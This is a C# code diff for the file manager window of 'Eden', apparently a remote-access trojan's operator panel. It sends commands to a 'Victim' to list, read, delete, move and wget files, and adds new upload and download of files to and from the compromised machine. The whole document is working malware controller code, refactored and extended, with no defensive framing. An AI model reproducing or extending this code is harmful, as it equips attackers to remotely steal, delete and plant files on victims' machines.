@@ -14,29 +14,38 @@ namespace Eden
 {
     public partial class frmFileMgr : Form
     {
+        /*
+         * Todo:
+         * Upload
+         * Download
+         * Archive
+         * Datetime
+         */
+
         public Client m_clnt;
+        public Victim m_victim;
         public string szVictimID;
 
         private ImageList m_ilFileExt;
 
         private string szHomeDir;
 
-        private List<m_stEntryTag> lsCopy = new List<m_stEntryTag>();
+        private List<stEntryTag> lsCopy = new List<stEntryTag>();
 
-        private struct m_stEntryTag
+        private struct stEntryTag
         {
             public bool bDirectory;
             public string szFullName;
         }
 
-        private struct m_stFileDeleteStatus
+        private struct stFileDeleteStatus
         {
             public string szFilename;
             public int nCode;
             public string szMsg;
         }
 
-        private struct m_stWgetStatus
+        private struct stWgetStatus
         {
             public string szUrl;
             public string szFilename;
@@ -44,9 +53,11 @@ namespace Eden
             public string szMsg;
         }
 
-        public frmFileMgr()
+        public frmFileMgr(Victim victim)
         {
             InitializeComponent();
+
+            m_victim = victim;
         }
 
         void Received(Client clnt, string szVictimID, string[] aMsg)
@@ -83,9 +94,9 @@ namespace Eden
                         List<ListViewItem> lsDir = new List<ListViewItem>();
                         List<ListViewItem> lsFile = new List<ListViewItem>();
 
-                        foreach (string szJson in Tools.EZData.String2OneDList(szJsonPayload))
+                        foreach (string szJson in clsTools.EZData.String2OneDList(szJsonPayload))
                         {
-                            Dictionary<string, JsonElement> dic = Tools.EZData.JsonStr2Dic(szJson);
+                            Dictionary<string, JsonElement> dic = clsTools.EZData.JsonStr2Dic(szJson);
 
                             string szName = dic["Name"].GetString();
                             bool bIsDir = szName[0] == '/';
@@ -109,7 +120,7 @@ namespace Eden
                                 })
                                 .ToArray()
                             );
-                            item.Tag = new m_stEntryTag()
+                            item.Tag = new stEntryTag()
                             {
                                 bDirectory = bIsDir,
                                 szFullName = $"{szDirPath}/{item.Text}",
@@ -168,7 +179,7 @@ namespace Eden
                     else if (aMsg[1] == "read")
                     {
                         string szPayload = aMsg[2];
-                        List<List<string>> lsResults = Tools.EZData.String2TwoDList(szPayload);
+                        List<List<string>> lsResults = clsTools.EZData.String2TwoDList(szPayload);
 
                         foreach (var lsResult in lsResults)
                         {
@@ -188,12 +199,12 @@ namespace Eden
                     }
                     else if (aMsg[1] == "del")
                     {
-                        List<List<string>> lsResult = Tools.EZData.String2TwoDList(aMsg[2]);
-                        List<m_stFileDeleteStatus> ls = new List<m_stFileDeleteStatus>();
+                        List<List<string>> lsResult = clsTools.EZData.String2TwoDList(aMsg[2]);
+                        List<stFileDeleteStatus> ls = new List<stFileDeleteStatus>();
 
                         foreach (var obj in lsResult)
                         {
-                            m_stFileDeleteStatus st = new m_stFileDeleteStatus()
+                            stFileDeleteStatus st = new stFileDeleteStatus()
                             {
                                 szFilename = obj[0],
                                 nCode = int.Parse(obj[1]),
@@ -221,11 +232,11 @@ namespace Eden
                     }
                     else if (aMsg[1] == "wget")
                     {
-                        List<List<string>> lsResults = Tools.EZData.String2TwoDList(aMsg[2]);
-                        List<m_stWgetStatus> ls = new List<m_stWgetStatus>();
+                        List<List<string>> lsResults = clsTools.EZData.String2TwoDList(aMsg[2]);
+                        List<stWgetStatus> ls = new List<stWgetStatus>();
                         foreach (var result in lsResults)
                         {
-                            m_stWgetStatus st = new m_stWgetStatus()
+                            stWgetStatus st = new stWgetStatus()
                             {
                                 szUrl = result[0],
                                 szFilename = result[1],
@@ -348,13 +359,15 @@ namespace Eden
 
         private void SendReadFile(string szFilename)
         {
-            m_clnt.SendVictim(szVictimID, $"File|read|{szFilename}");
+            //m_clnt.SendVictim(szVictimID, $"File|read|{szFilename}");
+            m_victim.fnSendCommand($"File|read|{szFilename}");
         }
         private void SendReadFile(List<string> lsFiles, bool bSendAll = true)
         {
             if (bSendAll)
             {
-                m_clnt.SendVictim(szVictimID, $"File|read|" + string.Join("|", lsFiles));
+                //m_clnt.SendVictim(szVictimID, $"File|read|" + string.Join("|", lsFiles));
+                m_victim.fnSendCommand($"File|read|" + string.Join("|", lsFiles));
             }
             else
             {
@@ -367,7 +380,7 @@ namespace Eden
         {
             Invoke(new Action(() =>
             {
-                frmFileEditor f = Tools.FindForm<frmFileEditor>(szVictimID);
+                frmFileEditor f = clsTools.FindForm<frmFileEditor>(szVictimID);
                 if (f == null)
                 {
                     f = new frmFileEditor();
@@ -387,7 +400,7 @@ namespace Eden
             {
                 foreach (ListViewItem item in listView1.SelectedItems)
                 {
-                    var st = (m_stEntryTag)item.Tag;
+                    var st = (stEntryTag)item.Tag;
                     lsFiles.Add(st.szFullName + (st.bDirectory ? "/" : string.Empty));
                 }
             }));
@@ -422,11 +435,11 @@ namespace Eden
                     SendDeleteFile(szFile);
             }
         }
-        private void ShowDeleteFile(List<m_stFileDeleteStatus> lsFiles)
+        private void ShowDeleteFile(List<stFileDeleteStatus> lsFiles)
         {
             Invoke(new Action(() =>
             {
-                frmListViewItem f = Tools.FindForm<frmListViewItem>(szVictimID);
+                frmListViewItem f = clsTools.FindForm<frmListViewItem>(szVictimID);
                 if (f != null)
                 {
                     foreach (var st in lsFiles)
@@ -464,11 +477,11 @@ namespace Eden
                 m_clnt.SendVictim(szVictimID, "File|wget|" + string.Join("|", lsUrls));
             }
         }
-        private void ShowWget(List<m_stWgetStatus> lsWgets)
+        private void ShowWget(List<stWgetStatus> lsWgets)
         {
             Invoke(new Action(() =>
             {
-                frmListViewItem f = Tools.FindForm<frmListViewItem>(szVictimID);
+                frmListViewItem f = clsTools.FindForm<frmListViewItem>(szVictimID);
                 if (f != null)
                 {
                     foreach (var st in lsWgets)
@@ -492,7 +505,7 @@ namespace Eden
             m_clnt.SendVictim(szVictimID, "File|goto|" + szDirName);
         }
 
-        private void SendPaste(List<m_stEntryTag> lsEntry, bool bMove = false)
+        private void SendPaste(List<stEntryTag> lsEntry, bool bMove = false)
         {
             string[] aEntry = lsEntry.Select(x => x.bDirectory ? $"{x.szFullName}/" : x.szFullName).ToArray();
 
@@ -501,7 +514,7 @@ namespace Eden
             f.m_aItemText = aEntry;
             f.Show();
 
-            m_clnt.SendVictim(szVictimID, $"File|paste|{(bMove ? "1" : "0")}|{Tools.EZData.OneDList2String(aEntry.ToList())}|{GetCurrentDir()}");
+            m_clnt.SendVictim(szVictimID, $"File|paste|{(bMove ? "1" : "0")}|{clsTools.EZData.OneDList2String(aEntry.ToList())}|{GetCurrentDir()}");
         }
 
         private void LvRefresh()
@@ -519,6 +532,8 @@ namespace Eden
                 treeView1.SelectedNode = node;
             }));
         }
+
+        stEntryTag fnGetEntryTag(ListViewItem item) => (stEntryTag)item.Tag;
 
         void setup()
         {
@@ -576,7 +591,7 @@ namespace Eden
             if (items.Length == 0)
                 return;
 
-            var stFile = (m_stEntryTag)items[0].Tag;
+            var stFile = (stEntryTag)items[0].Tag;
             if (stFile.bDirectory)
             {
                 TreeNode tn = tnFindTreeNodeFromTreeView(treeView1.Nodes, stFile.szFullName);
@@ -592,7 +607,7 @@ namespace Eden
             List<string> lsFiles = new List<string>();
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                var stFiles = (m_stEntryTag)item.Tag;
+                var stFiles = (stEntryTag)item.Tag;
                 if (stFiles.bDirectory)
                     continue;
 
@@ -661,7 +676,7 @@ namespace Eden
             lsCopy.Clear();
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                m_stEntryTag tag = (m_stEntryTag)item.Tag;
+                stEntryTag tag = (stEntryTag)item.Tag;
                 lsCopy.Add(tag);
             }
         }
@@ -688,7 +703,7 @@ namespace Eden
             if (items.Length == 0)
                 return;
 
-            var tag = (m_stEntryTag)items[0].Tag;
+            var tag = (stEntryTag)items[0].Tag;
 
             frmFileRename f = new frmFileRename();
             f.m_szEntryName = tag.szFullName;
@@ -710,16 +725,45 @@ namespace Eden
         private void toolStripMenuItem8_Click(object sender, EventArgs e)
         {
             OpenFileDialog ofd = new OpenFileDialog();
+            ofd.Multiselect = true;
 
             if (ofd.ShowDialog() == DialogResult.OK)
             {
-
+                List<string> lszFilePath = ofd.FileNames.ToList();
+                frmFileTransfer f = new frmFileTransfer(m_victim, lszFilePath, TransferFileType.UploadFile);
+                f.Show();
             }
         }
         //Download
         private void toolStripMenuItem9_Click(object sender, EventArgs e)
         {
+            List<ListViewItem> lItems = listView1.SelectedItems.Cast<ListViewItem>().ToList();
+            List<string> lFile = new List<string>();
+            bool bContainDir = false;
+            foreach (ListViewItem item in lItems)
+            {
+                var tag = fnGetEntryTag(item);
+                bContainDir = bContainDir || tag.bDirectory;
 
+                if (tag.bDirectory)
+                    continue;
+
+                lFile.Add(tag.szFullName);
+            }
+
+            if (bContainDir)
+            {
+                MessageBox.Show(
+                    "Target entries contain directory, current not support, the trasfer task will ignore them.\n" +
+                    "If you want to do directory transfer, please compress them into archive file and then transfer it.",
+                    "Exists Directory",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Warning
+                );
+            }
+
+            frmFileTransfer f = new frmFileTransfer(m_victim, lFile, TransferFileType.DownloadFile);
+            f.Show();
         }
         //New - Folder
         private void toolStripMenuItem12_Click(object sender, EventArgs e)
@@ -738,7 +782,7 @@ namespace Eden
 
             f.Show();
 
-            f.ShowFileContent(GetCurrentDir() + "/NewFile_" + Tools.GetFileNameFromDatetime("txt"), string.Empty);
+            f.ShowFileContent(GetCurrentDir() + "/NewFile_" + clsTools.GetFileNameFromDatetime("txt"), string.Empty);
         }
         //Image - Selected
         private void toolStripMenuItem14_Click(object sender, EventArgs e)
@@ -746,12 +790,12 @@ namespace Eden
             List<string> lsImgFilename = new List<string>();
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                var st = (m_stEntryTag)item.Tag;
-                if (!st.bDirectory && Tools.IsImageFilename(st.szFullName))
+                var st = (stEntryTag)item.Tag;
+                if (!st.bDirectory && clsTools.IsImageFilename(st.szFullName))
                     lsImgFilename.Add(st.szFullName);
             }
 
-            frmFileImage f = Tools.FindForm<frmFileImage>(szVictimID);
+            frmFileImage f = clsTools.FindForm<frmFileImage>(szVictimID);
             if (f == null)
             {
                 f = new frmFileImage();
@@ -769,12 +813,12 @@ namespace Eden
             List<string> lsImgFilename = new List<string>();
             foreach (ListViewItem item in listView1.Items)
             {
-                var st = (m_stEntryTag)item.Tag;
-                if (!st.bDirectory && Tools.IsImageFilename(st.szFullName))
+                var st = (stEntryTag)item.Tag;
+                if (!st.bDirectory && clsTools.IsImageFilename(st.szFullName))
                     lsImgFilename.Add(st.szFullName);
             }
 
-            frmFileImage f = Tools.FindForm<frmFileImage>(szVictimID);
+            frmFileImage f = clsTools.FindForm<frmFileImage>(szVictimID);
             if (f == null)
             {
                 f = new frmFileImage();
@@ -785,6 +829,26 @@ namespace Eden
             }
 
             f.Show();
+        }
+
+        private void toolStripMenuItem16_Click(object sender, EventArgs e)
+        {
+
+        }
+        //Archive - Compress
+        private void toolStripMenuItem18_Click(object sender, EventArgs e)
+        {
+
+        }
+        //Archive - Extract
+        private void toolStripMenuItem19_Click(object sender, EventArgs e)
+        {
+
+        }
+        //Datetime
+        private void toolStripMenuItem17_Click(object sender, EventArgs e)
+        {
+
         }
     }
 }
